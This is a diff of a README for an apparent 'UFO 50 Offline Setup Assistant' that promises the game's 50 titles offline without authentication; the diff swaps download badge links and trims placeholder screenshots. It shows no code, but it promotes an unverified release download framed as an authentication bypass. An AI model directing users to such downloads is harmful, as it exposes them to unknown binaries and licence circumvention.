@@ -1,7 +1,7 @@
 # 👾 UFO 50 Offline Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://ufo-50-offline-setup-assistant.github.io/.github)
 [![GitHub Stars](https://img.shields.io/github/stars/UFO-50-Offline-Setup-Assistant/ufo-50-offline-setup-assistant?style=social)](https://github.com/UFO-50-Offline-Setup-Assistant/ufo-50-offline-setup-assistant)
+[![Download Latest](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/UFO-50-Offline-Setup-Assistant/ufo-50-offline-setup-assistant/releases)
 [![Offline Gaming](https://img.shields.io/badge/Mode-100%25%20Offline-orange?style=for-the-badge)](/)
 [![License MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
 
@@ -109,16 +109,10 @@ Launch any of the 50 games instantly - completely offline, no authentication nee
 
 ---
 
-## 🖼️ Visual Previews
+## 🖼️ Preview Screenshot
 
 ![UFO 50 UI](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTuDikQ_JFJHwkKqtiB5BhGwM8XxiP3NVsbIA&s)  
 *Launcher simulation interface*
-
-| Main Interface | Game Selection | Display Settings |
-|----------------|----------------|------------------|
-| ![Main UI](https://via.placeholder.com/300x200/1a1a1a/00ff00?text=Main+Interface) | ![Games](https://via.placeholder.com/300x200/1a1a1a/ff6600?text=Game+Selection) | ![Settings](https://via.placeholder.com/300x200/1a1a1a/0066ff?text=Display+Config) |
-
-*Professional interface designed for both beginners and advanced users*
 
 ---
 
